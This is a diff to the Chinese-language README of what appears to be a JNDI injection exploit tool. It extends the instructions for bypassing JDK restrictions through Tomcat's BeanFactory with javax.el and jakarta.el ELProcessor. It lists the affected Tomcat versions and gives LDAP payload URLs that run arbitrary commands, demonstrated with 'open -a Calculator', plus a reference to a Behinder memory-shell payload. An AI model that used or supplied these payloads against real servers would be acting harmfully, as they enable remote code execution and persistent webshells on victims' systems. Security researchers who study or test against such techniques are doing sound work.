@@ -125,7 +125,7 @@ ldap://127.0.0.1:1389/Basic/MemShell/SpringWebMvc/Behinder/ControllerHandler
 
 ## BeanFactory 绕过
 
-基于 BeanFactory 绕过高版本 JDK 限制, Tomcat 版本需小于 8.5.79 或 9.0.63
+基于 BeanFactory 绕过高版本 JDK 限制, Tomcat 版本需小于 8.5.79、9.0.63、10.0.21 或 10.1.0-M14
 
 支持如下绕过方式:
 
@@ -142,11 +142,14 @@ ldap://127.0.0.1:1389/Basic/MemShell/SpringWebMvc/Behinder/ControllerHandler
 
 ### Tomcat ELProcessor
 
-利用 `javax.el.ELProcessor` 执行 EL 表达式
+利用 `javax.el.ELProcessor` (Tomcat 8-9) 或 `jakarta.el.ELProcessor` (Tomcat 10) 执行 EL 表达式
 
 ```bash
-# Tomcat Bypass
+# Tomcat Bypass (8-9)
 ldap://127.0.0.1:1389/TomcatBypass/Command/open -a Calculator
+
+# Tomcat Jakarta Bypass (10)
+ldap://127.0.0.1:1389/TomcatJakartaBypass/Command/open -a Calculator
 ```
 
 ### Groovy ClassLoader/Shell
